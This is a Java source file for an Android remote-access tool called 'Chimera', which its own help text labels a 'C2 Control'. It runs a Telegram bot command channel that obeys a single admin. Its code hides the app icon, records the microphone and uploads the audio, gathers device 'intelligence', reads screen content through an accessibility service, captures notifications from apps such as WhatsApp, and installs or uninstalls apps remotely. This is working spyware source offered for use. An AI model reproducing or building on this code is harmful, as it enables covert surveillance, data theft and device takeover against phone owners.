package com.chimera;

import android.accessibilityservice.AccessibilityService;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.provider.Settings;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.List;

public class TelegramBotWorker implements Runnable {
    private final Context context;
    private long lastUpdateId = 0;
    private enum WaitingState { NONE, FOR_PACKAGE_NAME_LAUNCH, FOR_PACKAGE_NAME_UNINSTALL, FOR_VOLUME, FOR_LINK_OPEN, FOR_NOTIFICATION_FILTER, FOR_IMAGE_OVERLAY, FOR_AUDIO_PLAY, FOR_APK_INSTALL }
    private WaitingState currentState = WaitingState.NONE;
    private int customDuration = 0;
    private int customScale = 100;

    public TelegramBotWorker(Context ctx) { this.context = ctx.getApplicationContext(); }
    public static String getNotificationFilter() { return notificationFilterPackage; }
    private static String notificationFilterPackage = null;

    @Override
    public void run() {
        while (!Thread.currentThread().isInterrupted()) {
            try { pollForUpdates(); Thread.sleep(3000); }
            catch (InterruptedException ie) { Thread.currentThread().interrupt(); break; }
            catch (Exception e) { ErrorLogger.logError(context, "RunLoop", e); }
        }
    }

    private void pollForUpdates() {
        HttpURLConnection conn = null;
        try {
            String token = ConfigLoader.getBotToken();
            if (token == null) return;
            String urlStr = "https://api.telegram.org/bot" + token + "/getUpdates?timeout=20&allowed_updates=[\"message\",\"callback_query\"]";
            if (lastUpdateId > 0) urlStr += "&offset=" + (lastUpdateId + 1);
            conn = (HttpURLConnection) new URL(urlStr).openConnection();
            if (conn.getResponseCode() != HttpURLConnection.HTTP_OK) return;
            String responseStr = streamToString(conn.getInputStream());
            JSONArray updates = new JSONObject(responseStr).getJSONArray("result");
            for (int i = 0; i < updates.length(); i++) {
                JSONObject update = updates.getJSONObject(i);
                lastUpdateId = update.getLong("update_id");
                if (update.has("message")) handleMessage(update.getJSONObject("message"));
                else if (update.has("callback_query")) handleCallback(update.getJSONObject("callback_query"));
            }
        } catch (Exception e) { ErrorLogger.logError(context, "Poll", e);
        } finally { if (conn != null) conn.disconnect(); }
    }

    private void handleMessage(JSONObject msg) {
        try {
            if (msg.getJSONObject("chat").getLong("id") != ConfigLoader.getAdminId()) return;
            if (msg.has("document") || msg.has("photo") || msg.has("audio")) { handleFileUpload(msg); return; }
            if (!msg.has("text")) return;
            String text = msg.getString("text").trim();
            if (handleStatefulReply(text)) return;
            String[] parts = text.split(" ");
            String command = parts[0].toLowerCase();
            switch (command) {
                case "/start": case "/help": sendHelpMessage(); break;
                case "/control": sendControlPanel(); break;
                case "/toggle_app_hide": DeviceControlHandler.setComponentState(context, false); sendMessage("App icon is now hidden.", context); break;
                case "/toggle_app_show": DeviceControlHandler.setComponentState(context, true); sendMessage("App icon is now visible.", context); break;
                case "/grant_usage_access":
                    Intent usageIntent = new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS);
                    usageIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    context.startActivity(usageIntent);
                    sendMessage("Usage Access settings opened. Please enable permission for the app.", context);
                    break;
                case "/open_link":
                    if (parts.length > 1) openLink(parts[1]);
                    else { currentState = WaitingState.FOR_LINK_OPEN; sendMessage("Reply with the full URL to open (e.g., https://google.com)", context); }
                    break;
                case "/show_image":
                    customDuration = 10; customScale = 100;
                    if (parts.length > 2) { try { customDuration = Integer.parseInt(parts[1]); customScale = Integer.parseInt(parts[2]); } catch (Exception ignored) {} }
                    currentState = WaitingState.FOR_IMAGE_OVERLAY;
                    sendMessage("Ready for image file. It will be shown for " + customDuration + "s at " + customScale + "% scale.", context);
                    break;
                case "/play_audio":
                    customDuration = -1;
                    if (parts.length > 1) { if (!"full".equalsIgnoreCase(parts[1])) { try { customDuration = Integer.parseInt(parts[1]); } catch (NumberFormatException ignored) {} } }
                    currentState = WaitingState.FOR_AUDIO_PLAY;
                    String durationText = customDuration > 0 ? "for " + customDuration + " seconds." : "completely.";
                    sendMessage("Ready for audio file. It will be played " + durationText, context);
                    break;
                case "/mic":
                    int micDuration = 30;
                    if (parts.length > 1) { try { micDuration = Integer.parseInt(parts[1]); } catch (NumberFormatException ignored) {} }
                    final int finalMicDuration = micDuration;
                    sendMessage("Recording " + finalMicDuration + "s of audio...", context);
                    AudioHandler.startRecording(context, finalMicDuration, new AudioHandler.AudioCallback() {
                        @Override public void onRecordingFinished(String filePath) { uploadAudio(filePath, ConfigLoader.getAdminId(), finalMicDuration + "s Audio", context); }
                        @Override public void onError(String error) { sendMessage("Audio Error: " + error, context); }
                    });
                    break;
                case "/device_details":
                    sendMessage("Gathering device intelligence...", context);
                    DeviceDetailsHelper.getDeviceDetails(context, details -> sendMessage(details, context));
                    break;
            }
        } catch (Exception e) { ErrorLogger.logError(context, "HandleMessage", e); }
    }

    private boolean handleStatefulReply(String text) {
        WaitingState previousState = currentState;
        if (previousState == WaitingState.NONE) return false;
        currentState = WaitingState.NONE;
        if (previousState == WaitingState.FOR_PACKAGE_NAME_LAUNCH) { launchApp(text); return true; }
        if (previousState == WaitingState.FOR_PACKAGE_NAME_UNINSTALL) { uninstallApp(text); return true; }
        if (previousState == WaitingState.FOR_VOLUME) { setVolume(text); return true; }
        if (previousState == WaitingState.FOR_LINK_OPEN) { openLink(text); return true; }
        if (previousState == WaitingState.FOR_NOTIFICATION_FILTER) { setNotificationFilter(text); return true; }
        currentState = previousState;
        return false;
    }
    
    private void handleFileUpload(JSONObject msg) {
        WaitingState previousState = currentState;
        currentState = WaitingState.NONE;
        try {
            String fileId = "", fileName = "tempfile";
            if (msg.has("document")) { fileId = msg.getJSONObject("document").getString("file_id"); fileName = msg.getJSONObject("document").getString("file_name");
            } else if (msg.has("photo")) { JSONArray p = msg.getJSONArray("photo"); fileId = p.getJSONObject(p.length() - 1).getString("file_id"); fileName = fileId + ".jpg";
            } else if (msg.has("audio")) { fileId = msg.getJSONObject("audio").getString("file_id"); fileName = msg.getJSONObject("audio").optString("file_name", fileId + ".mp3"); }
            switch (previousState) {
                case FOR_IMAGE_OVERLAY:
                    downloadFile(fileId, fileName, path -> {
                        Intent i = new Intent(context, OverlayService.class); i.setAction("ACTION_SHOW_IMAGE");
                        i.putExtra("imagePath", path); i.putExtra("duration", customDuration); i.putExtra("scale", customScale);
                        context.startService(i); sendMessage("Displaying image overlay...", context);
                    }); break;
                case FOR_AUDIO_PLAY:
                    downloadFile(fileId, fileName, path -> {
                        Intent i = new Intent(context, AudioPlaybackService.class); i.setAction("ACTION_PLAY_AUDIO");
                        i.putExtra("audioPath", path); i.putExtra("duration", customDuration);
                        context.startService(i); sendMessage("Playing remote audio...", context);
                    }); break;
                case FOR_APK_INSTALL:
                    if (fileName.toLowerCase().endsWith(".apk")) { downloadFile(fileId, fileName, this::installApp); } 
                    else { sendMessage("Error: The uploaded file is not an APK.", context); }
                    break;
                default: sendMessage("Received a file, but I don't know what to do with it.", context); break;
            }
        } catch (Exception e) { ErrorLogger.logError(context, "HandleFileUpload", e); }
    }

    private void handleCallback(JSONObject cb) {
        try {
            String data = cb.getString("data");
            long chatId = cb.getJSONObject("message").getJSONObject("chat").getLong("id");
            int messageId = cb.getJSONObject("message").getInt("message_id");
            if (!ChimeraAccessibilityService.isServiceEnabled() && (data.startsWith("ACC_") || data.equals("BACK_TO_GESTURES") || data.equals("SCREEN_OFF"))) { sendMessage("⚠️ Action Failed: Accessibility Service is not enabled.", context); return; }
            switch (data) {
                case "LIST_APPS": listAllApps(); break;
                case "LAUNCH_APP": currentState = WaitingState.FOR_PACKAGE_NAME_LAUNCH; sendMessage("Reply with the package name to launch.", context); break;
                case "UNINSTALL_APP": currentState = WaitingState.FOR_PACKAGE_NAME_UNINSTALL; sendMessage("Reply with the package name to uninstall.", context); break;
                case "SET_VOLUME": currentState = WaitingState.FOR_VOLUME; sendMessage("Reply with a volume level from 0 to 100.", context); break;
                case "INSTALL_APP": currentState = WaitingState.FOR_APK_INSTALL; sendMessage("Upload the APK file to install.", context); break;
                case "NOTIFICATIONS_PANEL": sendNotificationPanel(chatId, messageId); break;
                case "NOTIF_GET_EXISTING": context.sendBroadcast(new Intent("com.chimera.GET_ACTIVE_NOTIFICATIONS")); break;
                case "NOTIF_SET_FILTER": currentState = WaitingState.FOR_NOTIFICATION_FILTER; sendMessage("Reply with the package name to filter notifications for (e.g., com.whatsapp).", context); break;
                case "NOTIF_CLEAR_FILTER": setNotificationFilter(null); break;
                case "NOTIF_ENABLE": setNotificationListenerState(true); break;
                case "NOTIF_DISABLE": setNotificationListenerState(false); break;
                case "SCREEN_PANEL": sendScreenPanel(chatId, messageId); break;
                case "SCREEN_ON": context.startActivity(new Intent(context, WakeActivity.class).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)); break;
                case "SCREEN_OFF": ChimeraAccessibilityService.triggerGlobalAction(AccessibilityService.GLOBAL_ACTION_LOCK_SCREEN); break;
                case "FLASHLIGHT_ON": DeviceControlHandler.setFlashlightState(context, true); break;
                case "FLASHLIGHT_OFF": DeviceControlHandler.setFlashlightState(context, false); break;
                case "ACC_GET_CONTENT": sendMessage(ChimeraAccessibilityService.getScreenContent(), context); break;
                case "ACC_GESTURES": sendGesturePanel(chatId, messageId); break;
                case "ACC_ACTION_BACK": ChimeraAccessibilityService.triggerGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK); break;
                case "ACC_ACTION_HOME": ChimeraAccessibilityService.triggerGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME); break;
                case "ACC_ACTION_RECENTS": ChimeraAccessibilityService.triggerGlobalAction(AccessibilityService.GLOBAL_ACTION_RECENTS); break;
                case "BACK_TO_MAIN": sendControlPanel(chatId, messageId); break;
                case "EXIT_PANEL": editMessage(chatId, messageId, "Control panel closed."); break;
            }
        } catch (Exception e) { ErrorLogger.logError(context, "HandleCallback", e); }
    }

    private void launchApp(String packageName) {
        try {
            Intent intent = context.getPackageManager().getLaunchIntentForPackage(packageName);
            if (intent != null) {
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(intent);
                sendMessage("App launch requested: " + packageName, context);
            } else { sendMessage("Error: Could not launch " + packageName, context); }
        } catch (Exception e) { sendMessage("Error launching app: " + e.getMessage(), context); }
    }
    
    private void openLink(String url) {
        try {
            if (!url.startsWith("http")) url = "http://" + url;
            Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
            sendMessage("Opening link: " + url, context);
        } catch (Exception e) { sendMessage("Failed to open link.", context); }
    }

    private void uninstallApp(String packageName) {
        Intent intent = new Intent(Intent.ACTION_DELETE, Uri.parse("package:" + packageName));
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(intent);
        sendMessage("Uninstall requested for " + packageName + ".", context);
    }
    
    private void installApp(String apkPath) {
        File apkFile = new File(apkPath);
        if (!apkFile.exists()) { sendMessage("Error: APK file not found.", context); return; }
        Intent intent = new Intent(Intent.ACTION_VIEW, Uri.fromFile(apkFile));
        intent.setDataAndType(Uri.fromFile(apkFile), "application/vnd.android.package-archive");
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_GRANT_READ_URI_PERMISSION);
        context.startActivity(intent);
        sendMessage("Install requested for " + apkFile.getName() + ".", context);
    }

    private void setVolume(String levelStr) {
        try {
            DeviceControlHandler.setMediaVolume(context, Integer.parseInt(levelStr));
            sendMessage("Media volume set to " + levelStr + "%.", context);
        } catch (NumberFormatException e) { sendMessage("Error: Invalid number provided.", context); }
    }
    
    private void setNotificationFilter(String packageName) {
        notificationFilterPackage = packageName;
        if (packageName == null || packageName.isEmpty()) {
            sendMessage("Notification filter cleared. Capturing from all apps.", context);
        } else {
            sendMessage("Notification filter set. Only capturing from: `" + packageName + "`", context);
        }
    }
    
    private void setNotificationListenerState(boolean enable) {
        try {
            PackageManager pm = context.getPackageManager();
            ComponentName componentName = new ComponentName(context, NotificationListener.class);
            int state = enable ? PackageManager.COMPONENT_ENABLED_STATE_ENABLED : PackageManager.COMPONENT_ENABLED_STATE_DISABLED;
            pm.setComponentEnabledSetting(componentName, state, PackageManager.DONT_KILL_APP);
            sendMessage("Notification Listener service has been " + (enable ? "ENABLED" : "DISABLED") + ".", context);
        } catch (Exception e) { sendMessage("Failed to change Notification Listener state.", context); }
    }
    
    private void listAllApps() {
        new Thread(() -> {
            PackageManager pm = context.getPackageManager();
            List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
            StringBuilder appList = new StringBuilder();
            int count = 0;
            for (ApplicationInfo app : packages) {
                if ((app.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                    appList.append(pm.getApplicationLabel(app)).append("\n`").append(app.packageName).append("`\n\n");
                    count++;
                }
            }
            sendMessage("*--- " + count + " User-Installed Apps ---*\n" + appList.toString(), context);
        }).start();
    }
    
    private void sendHelpMessage() {
        sendMessage("`Chimera C2 Control`\n\n"
                + "`/control` - Show the main control panel.\n"
                + "`/mic <seconds>` - Record audio.\n"
                + "`/device_details` - Get device intel report.\n"
                + "`/toggle_app_hide` | `_show` - Toggle icon.\n"
                + "`/grant_usage_access` - Open Usage Access settings.\n"
                + "`/open_link [url]` - Open a link.\n"
                + "`/show_image [dur] [scale]` - Prompt for image upload.\n"
                + "`/play_audio [dur|full]` - Prompt for audio upload.\n"
                + "`/help` - Show this message.", context);
    }

    private void sendControlPanel() {
        try {
            JSONObject keyboard = new JSONObject();
            JSONArray rows = new JSONArray();
            rows.put(new JSONArray().put(new JSONObject().put("text", "List Apps").put("callback_data", "LIST_APPS")).put(new JSONObject().put("text", "Launch App").put("callback_data", "LAUNCH_APP")).put(new JSONObject().put("text", "Uninstall App").put("callback_data", "UNINSTALL_APP")));
            rows.put(new JSONArray().put(new JSONObject().put("text", "Install App (APK)").put("callback_data", "INSTALL_APP")).put(new JSONObject().put("text", "Set Volume").put("callback_data", "SET_VOLUME")));
            rows.put(new JSONArray().put(new JSONObject().put("text", "Notifications").put("callback_data", "NOTIFICATIONS_PANEL")).put(new JSONObject().put("text", "Gestures").put("callback_data", "ACC_GESTURES")));
            rows.put(new JSONArray().put(new JSONObject().put("text", "Screen & Device").put("callback_data", "SCREEN_PANEL")).put(new JSONObject().put("text", "Get Screen Content").put("callback_data", "ACC_GET_CONTENT")));
            rows.put(new JSONArray().put(new JSONObject().put("text", "❌ Exit Panel ❌").put("callback_data", "EXIT_PANEL")));
            keyboard.put("inline_keyboard", rows);
            sendMessageWithMarkup("`Chimera Control Panel`", keyboard);
        } catch (Exception e) { ErrorLogger.logError(context, "SendControlPanel", e); }
    }

    private void sendControlPanel(long chatId, int messageId) {
        editMessage(chatId, messageId, "");
        sendControlPanel();
    }
    
    private void sendNotificationPanel(long chatId, int messageId) {
        try {
            JSONObject keyboard = new JSONObject();
            JSONArray rows = new JSONArray();
            rows.put(new JSONArray().put(new JSONObject().put("text", "Read Active Notifications").put("callback_data", "NOTIF_GET_EXISTING")));
            rows.put(new JSONArray().put(new JSONObject().put("text", "Set App Filter").put("callback_data", "NOTIF_SET_FILTER")).put(new JSONObject().put("text", "Clear App Filter").put("callback_data", "NOTIF_CLEAR_FILTER")));
            rows.put(new JSONArray().put(new JSONObject().put("text", "Enable Service").put("callback_data", "NOTIF_ENABLE")).put(new JSONObject().put("text", "Disable Service").put("callback_data", "NOTIF_DISABLE")));
            rows.put(new JSONArray().put(new JSONObject().put("text", "« Back to Main Panel").put("callback_data", "BACK_TO_MAIN")));
            keyboard.put("inline_keyboard", rows);
            editMessageMarkup(chatId, messageId, "`Notification Control`", keyboard);
        } catch (Exception e) { ErrorLogger.logError(context, "SendNotifPanel", e); }
    }

    private void sendScreenPanel(long chatId, int messageId) {
        try {
            JSONObject keyboard = new JSONObject();
            JSONArray rows = new JSONArray();
            rows.put(new JSONArray().put(new JSONObject().put("text", "Screen On").put("callback_data", "SCREEN_ON")).put(new JSONObject().put("text", "Screen Off").put("callback_data", "SCREEN_OFF")));
            rows.put(new JSONArray().put(new JSONObject().put("text", "Flashlight On").put("callback_data", "FLASHLIGHT_ON")).put(new JSONObject().put("text", "Flashlight Off").put("callback_data", "FLASHLIGHT_OFF")));
            rows.put(new JSONArray().put(new JSONObject().put("text", "« Back to Main Panel").put("callback_data", "BACK_TO_MAIN")));
            keyboard.put("inline_keyboard", rows);
            editMessageMarkup(chatId, messageId, "`Screen & Device Control`", keyboard);
        } catch (Exception e) { ErrorLogger.logError(context, "SendScreenPanel", e); }
    }

    private void sendGesturePanel(long chatId, int messageId) {
        try {
            JSONObject keyboard = new JSONObject();
            JSONArray rows = new JSONArray();
            rows.put(new JSONArray().put(new JSONObject().put("text", "Back").put("callback_data", "ACC_ACTION_BACK")).put(new JSONObject().put("text", "Home").put("callback_data", "ACC_ACTION_HOME")).put(new JSONObject().put("text", "Recents").put("callback_data", "ACC_ACTION_RECENTS")));
            rows.put(new JSONArray().put(new JSONObject().put("text", "« Back to Main Panel").put("callback_data", "BACK_TO_MAIN")));
            keyboard.put("inline_keyboard", rows);
            editMessageMarkup(chatId, messageId, "`Gesture Control`", keyboard);
        } catch (Exception e) { ErrorLogger.logError(context, "SendGesturePanel", e); }
    }

    private void downloadFile(String fileId, String fileName, FileDownloadCallback callback) {
        new Thread(() -> {
            try {
                String token = ConfigLoader.getBotToken();
                String getPathUrl = "https://api.telegram.org/bot" + token + "/getFile?file_id=" + fileId;
                String response = streamToString(new URL(getPathUrl).openConnection().getInputStream());
                String filePath = new JSONObject(response).getJSONObject("result").getString("file_path");
                String downloadUrl = "https://api.telegram.org/file/bot" + token + "/" + filePath;
                File outputFile = new File(context.getCacheDir(), fileName);
                try (InputStream is = new URL(downloadUrl).openConnection().getInputStream(); FileOutputStream fos = new FileOutputStream(outputFile)) {
                    byte[] buffer = new byte[4096]; int bytesRead;
                    while ((bytesRead = is.read(buffer)) != -1) fos.write(buffer, 0, bytesRead);
                }
                callback.onFileDownloaded(outputFile.getAbsolutePath());
            } catch (Exception e) {
                ErrorLogger.logError(context, "FileDownloadError", e);
                sendMessage("Failed to download the file.", context);
            }
        }).start();
    }

    private interface FileDownloadCallback { void onFileDownloaded(String path); }
    private static String streamToString(InputStream is) throws Exception {
        ByteArrayOutputStream result = new ByteArrayOutputStream(); byte[] buffer = new byte[1024]; int length;
        while ((length = is.read(buffer)) != -1) result.write(buffer, 0, length);
        return result.toString("UTF-8");
    }

    private void editMessage(long chatId, int messageId, String text) {
         try {
            JSONObject body = new JSONObject(); body.put("chat_id", chatId); body.put("message_id", messageId);
            body.put("text", text); body.put("reply_markup", new JSONObject()); body.put("parse_mode", "Markdown");
            post("editMessageText", body, context);
        } catch (Exception e) { ErrorLogger.logError(context, "EditMessage", e); }
    }
    
    private void editMessageMarkup(long chatId, int messageId, String text, JSONObject markup) {
        try {
            JSONObject body = new JSONObject(); body.put("chat_id", chatId); body.put("message_id", messageId);
            body.put("text", text); body.put("reply_markup", markup); body.put("parse_mode", "Markdown");
            post("editMessageText", body, context);
        } catch (Exception e) { ErrorLogger.logError(context, "EditMarkup", e); }
    }

    private void sendMessageWithMarkup(String text, JSONObject markup) {
        try {
            JSONObject body = new JSONObject(); body.put("chat_id", ConfigLoader.getAdminId());
            body.put("text", text); body.put("reply_markup", markup); body.put("parse_mode", "Markdown");
            post("sendMessage", body, context);
        } catch (Exception e) { ErrorLogger.logError(context, "SendMessageWithMarkup", e); }
    }
    
    public static void sendMessage(String message, Context context) {
        if (message.length() > 4096) {
            for (int i = 0; i < message.length(); i += 4096) {
                String chunk = message.substring(i, Math.min(i + 4096, message.length()));
                sendMessageChunk(chunk, context);
            }
        } else {
            sendMessageChunk(message, context);
        }
    }

    private static void sendMessageChunk(String message, Context context) {
        try {
            JSONObject body = new JSONObject(); body.put("chat_id", ConfigLoader.getAdminId());
            body.put("text", message); body.put("parse_mode", "Markdown");
            post("sendMessage", body, context);
        } catch (Exception e) { ErrorLogger.logError(context, "SendMessageHelper", e); }
    }
    
    public static void post(String method, JSONObject json, Context context) {
        new Thread(() -> {
            try {
                URL url = new URL("https://api.telegram.org/bot" + ConfigLoader.getBotToken() + "/" + method);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
                conn.setDoOutput(true);
                try (OutputStream os = conn.getOutputStream()) { os.write(json.toString().getBytes(StandardCharsets.UTF_8)); }
                conn.getInputStream().close();
                conn.disconnect();
            } catch (Exception e) { ErrorLogger.logError(context, "Post", e); }
        }).start();
    }

    public static void uploadAudio(String filePath, long chatId, String caption, Context context) {
        uploadMultipart(filePath, chatId, caption, context, "sendAudio", "audio", "audio/mp4");
    }

    private static void uploadMultipart(String filePath, long chatId, String caption, Context context, String endpoint, String fieldName, String contentType) {
        final File fileToUpload = new File(filePath);
        if (!fileToUpload.exists()) return;
        new Thread(() -> {
            HttpURLConnection conn = null;
            try {
                String token = ConfigLoader.getBotToken();
                String urlStr = "https://api.telegram.org/bot" + token + "/" + endpoint;
                String boundary = "Boundary-" + System.currentTimeMillis(), LINE_FEED = "\r\n";
                conn = (HttpURLConnection) new URL(urlStr).openConnection();
                conn.setDoOutput(true);
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
                try (OutputStream os = conn.getOutputStream(); PrintWriter writer = new PrintWriter(os, true)) {
                    writer.append("--" + boundary).append(LINE_FEED).append("Content-Disposition: form-data; name=\"chat_id\"").append(LINE_FEED).append(LINE_FEED).append(String.valueOf(chatId)).append(LINE_FEED);
                    writer.append("--" + boundary).append(LINE_FEED).append("Content-Disposition: form-data; name=\"caption\"").append(LINE_FEED).append(LINE_FEED).append(caption).append(LINE_FEED);
                    writer.append("--" + boundary).append(LINE_FEED).append("Content-Disposition: form-data; name=\"" + fieldName + "\"; filename=\"" + fileToUpload.getName() + "\"").append(LINE_FEED);
                    writer.append("Content-Type: " + contentType).append(LINE_FEED).append(LINE_FEED).flush();
                    try (FileInputStream fis = new FileInputStream(fileToUpload)) {
                        byte[] buffer = new byte[4096]; int bytesRead;
                        while ((bytesRead = fis.read(buffer)) != -1) os.write(buffer, 0, bytesRead);
                    }
                    writer.append(LINE_FEED).flush();
                    writer.append("--" + boundary + "--").append(LINE_FEED);
                }
                conn.getInputStream().close();
            } catch (Exception e) { ErrorLogger.logError(context, "Upload", e);
            } finally { if (conn != null) conn.disconnect(); fileToUpload.delete(); }
        }).start();
    }
}